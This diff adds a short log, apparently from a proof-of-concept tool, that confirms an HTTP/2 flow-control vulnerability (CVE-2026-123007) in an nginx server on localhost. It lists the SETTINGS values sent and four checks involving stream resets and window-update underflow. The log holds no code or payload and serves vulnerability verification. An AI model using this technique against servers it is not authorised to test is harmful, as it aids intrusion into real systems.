@@ -1,0 +1,11 @@
+[*] target https://127.0.0.1:19443/ mode=safe resource=/index.html
+  resource=/index.html bytes=896 settings=[(3, 128), (4, 65536), (5, 16777215), (9, 1)]
+  flight sent; waiting for the cleanup oracle
+[+] CVE-2026-123007 PROOF: VULNERABLE
+    target: https://127.0.0.1:19443/   resource: /index.html
+    observed: server=Some("nginx/1.31.8") settings=[(3, 128), (4, 65536), (5, 16777215), (9, 1)] body=896 bytes
+    [1] queued-DATA refund      : PASS (2 streams reset with FLOW_CONTROL_ERROR=3)
+    [2] public-byte release    : PASS (10 bytes returned)
+    [3] underflowed WU guard   : PASS (post-refund PING ACK)
+    [4] connection still usable: PASS
+    no memory corruption, no crash, no shell
